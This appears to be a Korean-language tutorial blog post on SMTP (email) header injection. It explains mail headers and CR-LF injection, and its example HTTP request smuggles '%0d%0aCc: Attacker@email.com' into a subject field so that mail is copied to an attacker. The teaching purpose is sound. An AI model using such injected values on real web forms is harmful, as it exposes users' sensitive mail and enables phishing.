---
layout: single
title: SMTP Injection(Email injection)
categories: Web-vuln
tag: [SMTP Injection, Email injection, web, web vulnerability, injection]
toc: true
author_profile: false
---

# SMTP란 무엇일까?

> SMTP란 단순 전자우편 전송 프로토콜로서 대부분의 Email 소프트웨어 들이 사용하는 프로토콜이다. 보통 웹 어플리케이션에서 메일전송과 관련된 기능 및 API 는 SMTP 프로토콜을 통해 이루어진다.

# SMTP 를 통한 Injection??
웹페이지 내에서 이메일 전송 기능을 사용할 때 송/수신자 내용 제목 등등의 관련 양식을

**<u style="color:red;">SMTP 헤더에 포함</u>**시켜 전송하게 된다. 이 때 요청 **<u style="color:red;">헤더를 조작(Injection)</u>**을 통해서 공격자의 메일로 추가 전송을 시킬 수 있다.<br><br>
예를 들어 패스워드 변경후의 내용과 같은 민감한 정보가 수신자의 메일로 넘어갈 때 공격자의 메일정보를 요청헤더에 추가시켜 민감정보가 노출될 수 있다.<br>
이러한 헤더는 웹 서버의 이메일 라이브러리에 의해 해석되고 결과 SMTP 명령으로 변환된 다음 SMTP 서버에서 처리된다.

# SMTP Header
SMTP의 HTTP 요청 헤더를 조작 하여 공격을 수행할 수 있다고 소개했다. 그럼 SMTP 에서
사용되는 요청 헤더의 종류는 어떤것들이 존재할까?<br>
대표적으로 잘 알려진 헤더는 아래와 같다.

<div class="notice">
- From<br>
    &nbsp;&nbsp;&nbsp;&nbsp;- 메시지를 보내는 사람의 ID<br>
- Resent-From<br>
    &nbsp;&nbsp;&nbsp;&nbsp;- 메시지를 전달한 사람<br>
- Reply-To<br>
    &nbsp;&nbsp;&nbsp;&nbsp;- 응답을 보낼 사서함을 나타내는 메커니즘<br>
- Resent-Reply-To<br>
    &nbsp;&nbsp;&nbsp;&nbsp;- 회신을 전달해야 하는 사람<br>
- Return-Path<br>
    &nbsp;&nbsp;&nbsp;&nbsp;- 메시지 발신자에 대한 주소 및 경로에 대한 결정적 정보<br>
- Sender<br>
    &nbsp;&nbsp;&nbsp;&nbsp;- 메시지를 보낸 에이전트의 인증된 ID (사람, 시스템, 프로세스등)<br>
- Resent-Sender<br>
    &nbsp;&nbsp;&nbsp;&nbsp;- ㅁ메시지를 재전송한 에이전트의 인증된 ID<br>
- To<br>
    &nbsp;&nbsp;&nbsp;&nbsp;- 메신지의 기본 수신자<br>
- <u style="color:red;">Cc(참조)</u><br>
    &nbsp;&nbsp;&nbsp;&nbsp;- 메시지의 보조 수신자<br>
- <u style="color:red;">Bcc(숨은참조)</u><br>
    &nbsp;&nbsp;&nbsp;&nbsp;- 메시지의 추가 수신자
</div>

💡 **<u style="color:red;">SMTP 의 Header을 조작하기 위해 CR-LF Injection 을 활용하여 공격을 수행할 수 있다.</u>**

<div class="notice">
POST /emailtest HTTP/1.1<br>
<br>
'''<br>
<br>
subject=Hello+Test
</div>

위와 같이 subject 값을 받아서 관리자 혹은 특정 사용자에게 메일을 전송하는 기능이 존재하는
웹 사이트를 식별했다고 가정하자.<br><br>

해당 로직에서 SMTP의 취약한 부분이 존재하며, CR-LF 주입이 가능하다면
아래와 같이 값을 조작하여 Header 을 조작할 수 있다. 즉 송/수신자 혹은 내용등을 임의로 조작
할 수 있다는 것이다. 직 **<u style="color:red;">피싱</u>**메일로도 변질이 가능하다는 것이다.

# 공격 표면
특정 요청 혹은 로직에 의해 **<u style="color:red;">이메일기능</u>**이 적용되어, 이메일 전송 기능이 존재한다면, SMTP Injection의 잠재적 공격 표면이 될 수 있다.

## Cc 및 Bcc 조작
참조 및 숨은참조라는 뜻으로, 수신받는 사용자를 추가 시킬 수 있는 헤더이다.

<div class="notice">
POST /emailtest HTTP/1.1<br><br>

'''<br><br>

subject=Hello+Test%0d%0aCc: Attacker@email.com
</div>